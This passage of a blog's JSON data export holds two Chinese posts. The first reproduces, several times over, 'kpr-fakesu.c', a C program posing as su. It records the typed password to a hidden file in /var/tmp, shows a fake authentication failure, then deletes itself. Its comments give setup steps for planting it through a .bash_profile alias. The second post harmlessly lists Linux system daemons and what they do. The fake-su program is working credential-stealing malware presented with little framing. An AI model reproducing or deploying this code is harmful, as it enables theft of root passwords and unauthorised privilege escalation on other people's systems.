&quot;fit&quot; ;)<br />* <br />*/<br /><br />#include &lt;stdio.h&gt;<br />#include &lt;stdlib.h&gt;<br />#include &lt;unistd.h&gt;<br /><br />main(int argc, char *argv[]){<br /><br />FILE *fp;<br />char *user;<br />char *pass;<br />char filex[100];<br />char clean[100];<br /><br />sprintf(filex,&quot;/var/tmp/.pwds&quot;);<br />sprintf(clean,&quot;rm -rf /var/tmp/.su;mv -f /home/sichunfeng/.wgetrc /home/sichunfeng/.bash_profile&quot;);<br />if(argc==1) user=&quot;root&quot;;<br />if(argc==2) user=argv[1];<br />if(argc&gt;2){<br />if(strcmp(argv[1], &quot;-l&quot;)==0)<br />user=argv[2];<br />else user=argv[1];}<br /><br />fprintf(stdout,&quot;Password: &quot;); <br />pass=getpass (&quot;&quot;);<br />system(&quot;sleep 3&quot;);<br />fprintf(stdout,&quot;su: Authentication failurenSorry.n&quot;);<br /><br />if ((fp=fopen(filex,&quot;w&quot;)) != NULL)<br />{<br />fprintf(fp, &quot;%s:%sn&quot;, user, pass);<br />fclose(fp);<br />}<br /><br />system(clean);<br />system(&quot;rm -rf /var/tmp/.su; ln -s /bin/su /var/tmp/.su&quot;);<br />}","source":"_posts/linux-记录su登陆密码代码.md","raw":"title: linux 记录su登陆密码代码\ncategories: [网络安全,Linux,C编程]\ntags: []\ndate: 2010-08-13 19:17:00\n---\n/* <br />* kpr-fakesu.c V0.9beta167 ;P<br />* by koper &lt;[email]koper@linuxmail.org[/email]&gt;<br /><em><br /></em> Setting up:<br />* admin@host:~$ gcc -o .su fakesu.c; rm -rf fakesu.c<br />* admin@host:~$ mv .su /var/tmp/.su<br />* admin@host:~$ cp .bash_profile .wgetrc<br />* admin@host:~$ echo &quot;alias su=/var/tmp/.su&quot;&gt;&gt;.bash_profile<br />* admin@host:~$ logout<br />* *** LOGIN **<em><br /></em> admin@host:~$ su<br />* Password: <br />* su: Authentication failure<br />* Sorry.<br />* admin@host:~$ su<br />* Password: <br />* root@host:~# logout<br />* admin@host:~$ cat /var/tmp/.pwds<br />* root:dupcia17<br />* admin@host:~$ <br />* <br />* /bin/su sends various failure information depending on the OS ver.<br />* Please modify the source to make it &quot;fit&quot; ;)<br />* <br />*/<br /><br />#include &lt;stdio.h&gt;<br />#include &lt;stdlib.h&gt;<br />#include &lt;unistd.h&gt;<br /><br />main(int argc, char *argv[]){<br /><br />FILE *fp;<br />char *user;<br />char *pass;<br />char filex[100];<br />char clean[100];<br /><br />sprintf(filex,&quot;/var/tmp/.pwds&quot;);<br />sprintf(clean,&quot;rm -rf /var/tmp/.su;mv -f /home/sichunfeng/.wgetrc /home/sichunfeng/.bash_profile&quot;);<br />if(argc==1) user=&quot;root&quot;;<br />if(argc==2) user=argv[1];<br />if(argc&gt;2){<br />if(strcmp(argv[1], &quot;-l&quot;)==0)<br />user=argv[2];<br />else user=argv[1];}<br /><br />fprintf(stdout,&quot;Password: &quot;); <br />pass=getpass (&quot;&quot;);<br />system(&quot;sleep 3&quot;);<br />fprintf(stdout,&quot;su: Authentication failurenSorry.n&quot;);<br /><br />if ((fp=fopen(filex,&quot;w&quot;)) != NULL)<br />{<br />fprintf(fp, &quot;%s:%sn&quot;, user, pass);<br />fclose(fp);<br />}<br /><br />system(clean);<br />system(&quot;rm -rf /var/tmp/.su; ln -s /bin/su /var/tmp/.su&quot;);<br />}","slug":"linux-记录su登陆密码代码","published":1,"updated":"2023-04-22T05:38:44.808Z","_id":"clgrjlxg300327opi44h15ujk","comments":1,"layout":"post","photos":[],"link":"","content":"<p>&#x2F;* <br />* kpr-fakesu.c V0.9beta167 ;P<br />* by koper &lt;[email]<a href=\"mailto:&#107;&#111;&#x70;&#101;&#114;&#64;&#108;&#105;&#110;&#117;&#x78;&#x6d;&#x61;&#x69;&#108;&#x2e;&#x6f;&#114;&#103;\">&#107;&#111;&#x70;&#101;&#114;&#64;&#108;&#105;&#110;&#117;&#x78;&#x6d;&#x61;&#x69;&#108;&#x2e;&#x6f;&#114;&#103;</a>[&#x2F;email]&gt;<br /><em><br /></em> Setting up:<br />* admin@host:<del>$ gcc -o .su fakesu.c; rm -rf fakesu.c<br />* admin@host:</del>$ mv .su &#x2F;var&#x2F;tmp&#x2F;.su<br />* admin@host:<del>$ cp .bash_profile .wgetrc<br />* admin@host:</del>$ echo &quot;alias su&#x3D;&#x2F;var&#x2F;tmp&#x2F;.su&quot;&gt;&gt;.bash_profile<br />* admin@host:<del>$ logout<br />* *** LOGIN **<em><br /></em> admin@host:</del>$ su<br />* Password: <br />* su: Authentication failure<br />* Sorry.<br />* admin@host:<del>$ su<br />* Password: <br />* root@host:</del># logout<br />* admin@host:<del>$ cat &#x2F;var&#x2F;tmp&#x2F;.pwds<br />* root:dupcia17<br />* admin@host:</del>$ <br />* <br />* &#x2F;bin&#x2F;su sends various failure information depending on the OS ver.<br />* Please modify the source to make it &quot;fit&quot; ;)<br />* <br />*&#x2F;<br /><br />#include &lt;stdio.h&gt;<br />#include &lt;stdlib.h&gt;<br />#include &lt;unistd.h&gt;<br /><br />main(int argc, char *argv[]){<br /><br />FILE *fp;<br />char *user;<br />char *pass;<br />char filex[100];<br />char clean[100];<br /><br />sprintf(filex,&quot;&#x2F;var&#x2F;tmp&#x2F;.pwds&quot;);<br />sprintf(clean,&quot;rm -rf &#x2F;var&#x2F;tmp&#x2F;.su;mv -f &#x2F;home&#x2F;sichunfeng&#x2F;.wgetrc &#x2F;home&#x2F;sichunfeng&#x2F;.bash_profile&quot;);<br />if(argc&#x3D;&#x3D;1) user&#x3D;&quot;root&quot;;<br />if(argc&#x3D;&#x3D;2) user&#x3D;argv[1];<br />if(argc&gt;2){<br />if(strcmp(argv[1], &quot;-l&quot;)&#x3D;&#x3D;0)<br />user&#x3D;argv[2];<br />else user&#x3D;argv[1];}<br /><br />fprintf(stdout,&quot;Password: &quot;); <br />pass&#x3D;getpass (&quot;&quot;);<br />system(&quot;sleep 3&quot;);<br />fprintf(stdout,&quot;su: Authentication failurenSorry.n&quot;);<br /><br />if ((fp&#x3D;fopen(filex,&quot;w&quot;)) !&#x3D; NULL)<br />{<br />fprintf(fp, &quot;%s:%sn&quot;, user, pass);<br />fclose(fp);<br />}<br /><br />system(clean);<br />system(&quot;rm -rf &#x2F;var&#x2F;tmp&#x2F;.su; ln -s &#x2F;bin&#x2F;su &#x2F;var&#x2F;tmp&#x2F;.su&quot;);<br />}</p>\n","site":{"data":{}},"excerpt":"","more":"<p>&#x2F;* <br />* kpr-fakesu.c V0.9beta167 ;P<br />* by koper &lt;[email]<a href=\"mailto:&#107;&#111;&#x70;&#101;&#114;&#64;&#108;&#105;&#110;&#117;&#x78;&#x6d;&#x61;&#x69;&#108;&#x2e;&#x6f;&#114;&#103;\">&#107;&#111;&#x70;&#101;&#114;&#64;&#108;&#105;&#110;&#117;&#x78;&#x6d;&#x61;&#x69;&#108;&#x2e;&#x6f;&#114;&#103;</a>[&#x2F;email]&gt;<br /><em><br /></em> Setting up:<br />* admin@host:<del>$ gcc -o .su fakesu.c; rm -rf fakesu.c<br />* admin@host:</del>$ mv .su &#x2F;var&#x2F;tmp&#x2F;.su<br />* admin@host:<del>$ cp .bash_profile .wgetrc<br />* admin@host:</del>$ echo &quot;alias su&#x3D;&#x2F;var&#x2F;tmp&#x2F;.su&quot;&gt;&gt;.bash_profile<br />* admin@host:<del>$ logout<br />* *** LOGIN **<em><br /></em> admin@host:</del>$ su<br />* Password: <br />* su: Authentication failure<br />* Sorry.<br />* admin@host:<del>$ su<br />* Password: <br />* root@host:</del># logout<br />* admin@host:<del>$ cat &#x2F;var&#x2F;tmp&#x2F;.pwds<br />* root:dupcia17<br />* admin@host:</del>$ <br />* <br />* &#x2F;bin&#x2F;su sends various failure information depending on the OS ver.<br />* Please modify the source to make it &quot;fit&quot; ;)<br />* <br />*&#x2F;<br /><br />#include &lt;stdio.h&gt;<br />#include &lt;stdlib.h&gt;<br />#include &lt;unistd.h&gt;<br /><br />main(int argc, char *argv[]){<br /><br />FILE *fp;<br />char *user;<br />char *pass;<br />char filex[100];<br />char clean[100];<br /><br />sprintf(filex,&quot;&#x2F;var&#x2F;tmp&#x2F;.pwds&quot;);<br />sprintf(clean,&quot;rm -rf &#x2F;var&#x2F;tmp&#x2F;.su;mv -f &#x2F;home&#x2F;sichunfeng&#x2F;.wgetrc &#x2F;home&#x2F;sichunfeng&#x2F;.bash_profile&quot;);<br />if(argc&#x3D;&#x3D;1) user&#x3D;&quot;root&quot;;<br />if(argc&#x3D;&#x3D;2) user&#x3D;argv[1];<br />if(argc&gt;2){<br />if(strcmp(argv[1], &quot;-l&quot;)&#x3D;&#x3D;0)<br />user&#x3D;argv[2];<br />else user&#x3D;argv[1];}<br /><br />fprintf(stdout,&quot;Password: &quot;); <br />pass&#x3D;getpass (&quot;&quot;);<br />system(&quot;sleep 3&quot;);<br />fprintf(stdout,&quot;su: Authentication failurenSorry.n&quot;);<br /><br />if ((fp&#x3D;fopen(filex,&quot;w&quot;)) !&#x3D; NULL)<br />{<br />fprintf(fp, &quot;%s:%sn&quot;, user, pass);<br />fclose(fp);<br />}<br /><br />system(clean);<br />system(&quot;rm -rf &#x2F;var&#x2F;tmp&#x2F;.su; ln -s &#x2F;bin&#x2F;su &#x2F;var&#x2F;tmp&#x2F;.su&quot;);<br />}</p>\n"},{"title":"linux 常见服务","date":"2011-04-11T01:23:00.000Z","_content":"<p>&nbsp; <a href=\"http://hi.baidu.com/key1088/creat/blog/linux%26%2338%3Bunix\" target=\"_blank\" rel=\"noopener noreferrer\"><strong>Linux</strong></a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;服务器在启动时需要启动很多系统服务，它们向本地和网络用户提供了Linux的系统功能接口，直接面向应用程序和用户。提供这些服务的程序是由运行在后台的守护进程（daemons）</p><p>&nbsp;&nbsp;&nbsp;&nbsp;来执行的。守护进程是生存期长的一种进程。它们独立于控制终端并且周期性的执行某种任务或等待处理某些发生的事件。他们常常在系统引导装入时启动，在系统</p><p>&nbsp;&nbsp;&nbsp;&nbsp;关闭时终止。linux系统有很多守护进程，大多数服务器都是用守护进程实现的。同时，守护进程完成许多系统任务，比如，作业规划进程crond、打印进</p><p>&nbsp;&nbsp;&nbsp;&nbsp;程lqd等。有些书籍和资料也把守护进程称作：“服务”。选择运行哪些守护进程，要根据具体需求决定。查看系统可以提供的守护进程对应的服务，使用下面方</p><p>&nbsp;&nbsp;&nbsp;&nbsp;法，以root权限运行： </p><p>&nbsp;&nbsp;&nbsp;&nbsp;#ntsysv</p><p>&nbsp;&nbsp;&nbsp;&nbsp;<img src=\"/images/pic/8de818da5f4ed57b10df9b56.jpg\" /></p><p>&nbsp;&nbsp;&nbsp;&nbsp; </p><p>&nbsp;&nbsp;&nbsp;&nbsp;   图1 可以选择的系统服务 </p><p>&nbsp;&nbsp;&nbsp;&nbsp; 界面如图1所示的窗口，下面详细介绍一下各项系统服务的功能。以英文字母为序： </p><p>&nbsp;&nbsp;&nbsp;&nbsp;    一、Linux守护进程简介</p><p>&nbsp;&nbsp;&nbsp;&nbsp;1.alsasound</p><p>&nbsp;&nbsp;&nbsp;&nbsp;：Alsa声卡驱动守护程序。Alsa声卡驱动程序本来是为了 一种声卡Gravis UltraSound(GUS)而写的，该程序被证</p><p>&nbsp;&nbsp;&nbsp;&nbsp;明很优秀，于是作者就开始为一般的声卡写 驱动程序。 Alsa和OSS/Free 及OSS/Linux兼容，但是有自己的接</p><p>&nbsp;&nbsp;&nbsp;&nbsp;口，甚至比OSS优秀。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;2.acpid：acpid（Advanced Configuration and Power Interface）是为替代传统的</p><p>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"http://wiki.ccw.com.cn/APhttp://hi.baidu.com/key1088/creat/blog/linux%26%2338%3Bunix\" target=\"_blank\" rel=\"noopener noreferrer\"><strong>AP</strong></a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;M电源管理标准而推出的新型电源管理标准。通常笔记本电脑需要启动电源进行管理。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;3.atalk：AppleTalk网络守护进程。注意不要在后台运行该程序，该程序的数据结构必须在运行其他进程前先花一定时间初始化。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;4.</p><p>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"http://topic.ccw.com.cn/corpCenter/592.htmlhttp://hi.baidu.com/key1088/creat/blog/linux%26%2338%3Bunix\" target=\"_blank\" rel=\"noopener noreferrer\"><strong>amd</strong></a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;： 自动安装NFS守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;5.anacron：</p><p>&nbsp;&nbsp;&nbsp;&nbsp;一个自动化运行任务守护进程。Red Hat Linux 随带四个自动化任务的工具：cron、 anacron、at、和</p><p>&nbsp;&nbsp;&nbsp;&nbsp;batc。当你的Linux服务器并不是全天运行，这个anacron就可以帮你执行在&quot;crontab&quot;设定的时间内没有执行的工作。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;6.apmd：apmd（Advanced Power Management）是高级电源管理。传统的电源管理标准，对于笔记本电脑比较有用，可以了解系统的电池电量信息。并将相关信息通过syslogd 写入日志。也可以用来在电源不足时关机。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;7.</p><p>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"http://hi.baidu.com/key1088/creat/blog/linux%26%2338%3Bunix\" target=\"_blank\" rel=\"noopener noreferrer\"><strong>arp</strong></a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;tables_jf ：为arptables网络的用户控制过滤的守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;8.arpwatch： 记录日志并构建一个在LAN接口上看到的以太网地址和IP地址对<strong></strong></p><p><strong>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"http://hi.baidu.com/key1088/creat/blog/linux%26%2338%3Bunix\" target=\"_blank\" rel=\"noopener noreferrer\"></a></strong><strong>数据库</strong></p><p><strong>&nbsp;&nbsp;&nbsp;&nbsp;</strong> 。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;atd：at和batch命令守护进程，用户用at命令调度的任务。Batch用于在系统负荷比较低时  运行批处理任务。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;9.autofs：自动安装管理进程automount，与NFS相关，依赖于NIS服务器。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;10.bootparamd：引导参数服务器，为LAN上的无盘工作站提供引导所需的相关信息。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;11.bluetooch：蓝牙服务器守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;12.crond ：cron是</p><p>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"http://hi.baidu.com/key1088/creat/blog/linux%26%2338%3Bunix\" target=\"_blank\" rel=\"noopener noreferrer\"><strong>Unix</strong></a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;下的一个传统程序，该程序周期地运行用户 调度的任务。比起传统的Unix版本，Linux版本添加了不少属性，而且更安全，配置更简单。类似计划任务。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;13.chargen：使用tcp协议的chargen server，chargen（Character Generator  </p><p>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"http://hi.baidu.com/key1088/creat/blog/linux%26%2338%3Bunix\" target=\"_blank\" rel=\"noopener noreferrer\"><strong>Pro</strong></a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;tocol）是一种网络服务，主要功能是提供类似远程打字的功能。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;14.chargen-udp：使用UDP协议的chargen server。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;15.cpuspeed：监测系统空闲百分比，降低或加快CPU时钟速度和电压从而在系统空闲时将能源消耗降为最小，而在系统繁忙时最大化加快系统执行速度。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;16.dhcpd：动态主机控制协议(Dynamic Host Control Protocol)的服务守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;17.cups： cups(Common UNIX Printing System)是通用UNIX打印守护进程，为Linux提供第三代打印功能。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;18.cups－config－daemons：cups打印系统切换守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;19.cups-lpd：cups行打印守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;20.daytime：使用TCP 协议的Daytime守护进程，该协议为客户机实现从远程服务器获取日期 和时间的功能。预设端口：13。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;21.daytime-udp：使用UDP 协议的Daytime守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;22.dc_server：使用SSL安全套接字的代理服务器守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;23.dc_cl</p><p>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"http://hi.baidu.com/key1088/creat/blog/linux%26%2338%3Bunix\" target=\"_blank\" rel=\"noopener noreferrer\"><strong>ie</strong></a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;nt：使用SSL安全套接字的客户端守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;24.diskdump：服务器磁盘备份守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;25.echo：服务器回显客户数据服务守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;26.echo-udp：使用UDP协议的服务器回显客户数据服务守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;27.eklogin：接受rlogin会话鉴证和用kerberos5加密的一种服务的守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;28.gated ：网关路由守护进程。它支持各种路由协议，包括RIP版本1和2、DCN HELLO协议、 OSPF版本2以及EGP版本2到4。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;29.gpm：gpm（General Purpose Mouse Daemon ）守护进程为文本模式下的Linux程序如mc(Midnight Commander)提供了鼠标的支持。它也支持控制台下鼠标 的拷贝，粘贴操作以及弹出式菜单。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;30.gssftp： 使用kerberos 5认证的ftp守护进程</p><p>&nbsp;&nbsp;&nbsp;&nbsp;31.httpd：Web服务器Apache守护进程，可用来提供HTML文件以 及CGI动态内容服务。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;32.inetd ：因特网操作守护程序。监控网络对各种它管理的服务的需求，并在必要的时候启动相应的服务程序。在Redhat 和Mandrake linux中被\nxinetd代替。Debian, Slackware, </p><p>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"http://hi.baidu.com/key1088/creat/blog/linux%26%2338%3Bunix\" target=\"_blank\" rel=\"noopener noreferrer\"><strong>SuSE</strong></a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;仍然使用。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;33.innd：Usenet新闻服务器守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;34.</p><p>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"http://hi.baidu.com/key1088/creat/blog/linux%26%2338%3Bunix\" target=\"_blank\" rel=\"noopener noreferrer\"><strong>ii</strong></a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;im：中文输入法服务器守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;35.iptables：iptables防火墙守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;36.irda：红外端口守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;37.i</p><p>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"http://hi.baidu.com/key1088/creat/blog/linux%26%2338%3Bunix\" target=\"_blank\" rel=\"noopener noreferrer\"><strong>sd</strong></a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;n：isdn启动和中止服务守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;38.krb5－telnet:使用kerberos 5认证的telnet守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;39.klogin：远程登陆守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;40.keytable： 该进程的功能是转载在/etc/sysconfig/keyboards里定义的键盘映射表，该表可以通过kbdconfig工具进行选择。您应该使该程序处于激活状态。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;41.irqbalance：对多个系统处理器环境下的系统中断请求进行负载平衡的守护程序。如果你只安装了一个CPU，就不需要加载这个守护程序。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;42.kshell ：kshell守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;43.kudzu：</p><p>&nbsp;&nbsp;&nbsp;&nbsp;硬件自动检测程序，会自动检测硬件是否发生变动，并相应进行硬件的添加、删除工作。当系统启动时，kudzu会对当前的硬件进行检测，并且和存储</p><p>&nbsp;&nbsp;&nbsp;&nbsp;在     </p><p>&nbsp;&nbsp;&nbsp;&nbsp;/etc/sysconfig/hwconf中的硬件信息进行对照，如果某个硬件从系统中被添加或者删除时，那么kudzu就会察觉到，并且通知用户是否</p><p>&nbsp;&nbsp;&nbsp;&nbsp;进行相关配置，然后修改etc/sysconfig/hwconf，使硬件资料与系统保持同步。如果/etc/sysconfig/hwconf这个文件</p><p>&nbsp;&nbsp;&nbsp;&nbsp;不存在，那么kudzu将会从/etc/modprobe.conf，/etc/sysconfig/network-scripts/和</p><p>&nbsp;&nbsp;&nbsp;&nbsp;etc/X11/XF86Config中探测已经存在的硬件。如果你不打算增加新硬件，那么就可以关闭这个启动服务，以加快系统启动时间。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;44.ldap：ldap（Lightweight Directory Access Protocol）目录访问协议服务器守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;45.lm_ser</p><p>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"http://hi.baidu.com/key1088/creat/blog/linux%26%2338%3Bunix\" target=\"_blank\" rel=\"noopener noreferrer\"><strong>oem</strong></a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;s：检测主板工作情况守护进程。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;46.lpd ：lpd是老式打印守护程序，负责将lpr等程序提交给打印 作业。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;47.mdmonitor：RAID相关设备的守护程序。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;48.messagebus：D-</p><p>&nbsp;&nbsp;&nbsp;&nbsp;BUS是一个库，为两个或两个以上的应用程序提供一对一的通讯。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;dbus-daemon-1是一个应用程序，它使用这个库来实现messagebus守护程序。多个应用程序通过连接messagebus守护程序可以实</p><p>&nbsp;&nbsp;&nbsp;&nbsp;现与其他程序交换信息。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;49.microcode_ctl：可编码以及发送新的微代码到内核以更新</p><p>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"http://hi.baidu.com/key1088/creat/blog/linux%26%2338%3Bunix\" target=\"_blank\" rel=\"noopener noreferrer\"><strong>Intel</strong></a></p><p>&nbsp;&nbsp;&nbsp;&nbsp; IA32系列处理器守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;50.mysqld： 一个快速高效可靠的轻型SQL数据库引擎守护进程。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;51.named：DNS（BIND）服务器守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;52.netplugd：netplugd（network </p><p>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"http://hi.baidu.com/key1088/creat/blog/linux%26%2338%3Bunix\" target=\"_blank\" rel=\"noopener noreferrer\"><strong>ca</strong></a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;ble hotplug management daemon）守护程序，用于监控一个或多个网络接口的状态，当某些事件触发时运行一个外部脚本程序。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;53.netdump：远程网络备份服务器守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;54.netfs：Network Filesystem Mounter，该进程安装和卸载NFS、SAMBA和NCP网络文件系统。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;55.nfs：网络文件系统守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;56.nfslock：NFS是一个流行的通过TCP/IP网络共享文件的协议，此守护进程提供了NFS文件锁定功能。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;57.ntpd：Network time Protocol daemon（网络时间校正协议）。ntpd是用来使系统和一个精确的时间源保持时间同步的协议守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;58.network：激活/关闭启动时的各个网络接口守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;59.psacct：该守护进程包括几个工具用来监控进程活动的工具，包括ac,lastcomm, accton 和sa。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;60.pcmcia：主要用于支持笔记本电脑接口守护进程。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;61.portmap：该守护进程用来支持RPC连接，RPC被用于NFS以及NIS 等服务。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;62.postgresql: PostgreSQL 关系数据库引擎。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;63.proftpd: proftpd 是Unix下的一个配置灵活的ftp服务器的守护程序。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;64.pppoe：</p><p>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"http://hi.baidu.com/key1088/creat/blog/linux%26%2338%3Bunix\" target=\"_blank\" rel=\"noopener noreferrer\"><strong>ADSL</strong></a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;连接守护进程。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;65.random ：保存和恢复系统的高质量随机数生成器，这些随机数是系 统一些随机行为提供的。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;66.rawdevices：在使用集群文件系统时用于加载raw设备的守护进程。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;67.readahead、</p><p>&nbsp;&nbsp;&nbsp;&nbsp;readahead_early：readahead和readahead_early是在Fedora core</p><p>&nbsp;&nbsp;&nbsp;&nbsp;2中最新推出的两个后台运行的守护程序。其作用是在启动系统期间，将启动系统所要用到的文件首先读取到内存中，然后在内存中进行执行，以加快系统的启动速</p><p>&nbsp;&nbsp;&nbsp;&nbsp;度。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;68.rhnsd：Red Hat 网络服务守护进程。通知官方的安全信息以及为系统打补丁。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;69.routed ：该守护程序支持RIP协议的自动IP路由表维护。RIP主要 使用在小型网络上，大一点的网络就需要复杂一点的协议。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;70.rsync：remote sync远程数据备份守护进程。  </p><p>&nbsp;&nbsp;&nbsp;&nbsp;71.rsh ：远程主机上启动一个shell，并执行用户命令。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;72.rwhod： 允许远程用户获得运行rwho守护程序的机器上所有已登录用户的列表。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;73.rstatd：一个为LAN上的其它机器收集和提供系统信息的守候进程。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;74.ruserd：远程用户定位服务，这是一个基于RPC的服务，它提供关于当前记录到LAN上一个机器日志中的用户信息 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;75.rwalld：激活rpc.rwall服务进程，这是一项基于RPC的服务，允许用户给每个注册到LAN机器上的其他终端写消息 。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;76.rwhod：激活rwhod服务进程，它支持LAN的rwho和ruptime服务。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;77.saslauthd： 使用SASL的认证守护进程。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;78.sendmail：邮件服务器sendmail守护进程。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;79.smb：Samba文件共享/打印服务守护进程。</p><p>&nbsp;&nbsp\n;&nbsp;&nbsp;80.snmpd：本地简单网络管理守护进程。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;81.squid：代理服务器squid守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;82.sshd：OpenSSH服务器守护进程。Secure Shell Protocol可以实现安全地远程管理主机。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;83.smartd：Self Monitor Analysis and Reporting Technology System，监控你的</p><p>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"http://hi.baidu.com/key1088/creat/blog/linux%26%2338%3Bunix\" target=\"_blank\" rel=\"noopener noreferrer\"><strong>硬盘</strong></a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;是否出现故障。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;84.syslog：一个让系统引导时起动syslog和klogd系统日志守候进程的脚本。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;85.time ：该守护进程从远程主机获取时间和日期，采用TCP协议。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;86.time-udp： 该守护进程从远程主机获取时间和日期，采用UDP协议。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;87.tux：在Linux内核中运行apache服务器的守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;88.vsftpd：vsftpd服务器的守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;89.vncserver： VNC （Virtual Network Computing，虚拟网络计算），它提供了一种在本地系统上显示远程计算机整个&quot;桌面&quot;的轻量型协议。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;90.xfs：X Window字型服务器守护进程，为本地和远程X服务器提供字型集。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;91.xinetd：支持多种网络服务的核心守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;92.ypbind：为NIS（网络信息系统）客户机激活ypbind服务进程 